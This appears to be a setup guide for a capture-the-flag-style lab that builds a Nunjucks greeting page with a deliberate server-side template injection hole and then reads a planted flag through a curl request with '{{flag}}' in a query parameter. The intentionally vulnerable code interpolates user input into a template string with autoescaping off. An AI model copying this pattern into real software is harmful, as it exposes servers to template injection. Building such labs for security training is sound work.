# Server-Side Template Injection (SSTI)

## Overview
A greeting page vulnerable to SSTI via Nunjucks template engine.

## Architecture
- **Backend**: Node.js + Express + Nunjucks
- **Vulnerability**: User input rendered directly in template string

## Phase 1: Docker/DB Files

```bash
cat << 'EOF' > docker-compose.yml
version: '3'
services:
  app:
    build: .
    container_name: app
    ports:
      - "3000:3000"
EOF
```

```bash
cat << 'EOF' > Dockerfile
FROM node:18
WORKDIR /app
COPY package*.json ./
RUN npm install
COPY . .
EXPOSE 3000
CMD ["node", "app.js"]
EOF
```

## Phase 2: Dependencies

```bash
npm init -y && npm install express nunjucks
```

## Phase 3: Vulnerable App

```bash
cat << 'EOF' > app.js
const express = require('express');
const nunjucks = require('nunjucks');

const app = express();

const env = nunjucks.configure({ autoescape: false });
env.addGlobal('flag', 'FLAG_PLACEHOLDER');

app.get('/greet', (req, res) => {
    const name = req.query.name || 'World';
    // VULNERABLE: User input in template string
    const template = `<h1>Hello ${name}!</h1><p>Welcome to our site.</p>`;
    const rendered = nunjucks.renderString(template, {});
    res.send(rendered);
});

app.listen(3000, '0.0.0.0', () => console.log('Listening on 0.0.0.0:3000'));
EOF
```

## Phase 4: Deploy
```bash
docker compose up -d --build
```

## Phase 5: Exploit
```bash
curl -s "http://localhost:3000/greet?name={{flag}}"
```
